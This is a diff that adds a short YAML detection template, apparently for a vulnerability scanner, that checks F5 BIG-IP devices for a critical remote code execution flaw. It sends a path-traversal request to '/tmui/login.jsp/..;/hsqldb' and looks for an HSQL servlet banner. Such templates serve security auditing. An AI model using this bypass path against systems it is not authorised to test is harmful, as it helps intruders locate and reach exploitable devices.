@@ -1,0 +1,16 @@
+id: poc-yaml-f5-big-ip-remote-code-execution
+info:
+  name: F5 BIG-IP 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: F5
+requests:
+- method: GET
+  path: /tmui/login.jsp/..;/hsqldb
+  headers: {}
+  expression: 'status_code == 200 && contains(body, "HSQL Database Engine Servlet")
+
+    '
+variables: {}
+transport: http
